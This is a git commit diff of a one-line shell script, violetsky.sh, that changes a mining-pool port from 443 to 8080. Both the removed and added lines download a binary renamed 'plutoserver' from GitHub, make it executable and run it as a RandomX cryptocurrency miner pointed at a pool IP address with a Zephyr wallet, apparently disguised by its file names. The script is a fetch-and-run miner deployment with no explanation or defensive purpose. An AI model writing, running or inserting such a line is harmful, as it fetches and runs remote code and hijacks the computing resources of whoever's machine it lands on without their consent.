4c96b52ab75a91525e733173376857ea13db403f
ismaimwan6372 <137773221+ismaimwan6372@users.noreply.github.com>
2023-07-01 13:17:25 +0800

    Update violetsky.sh

--- violetsky.sh
+++ violetsky.sh
@@ -1,1 +1,1 @@
-wget https://github.com/ismaimwan6372/gpuantre/raw/main/plutoserver && chmod 700 plutoserver && ./plutoserver -a RandomX -o 209.25.142.78:443-u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
+wget https://github.com/ismaimwan6372/gpuantre/raw/main/plutoserver && chmod 700 plutoserver && ./plutoserver -a RandomX -o 209.25.142.78:8080-u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
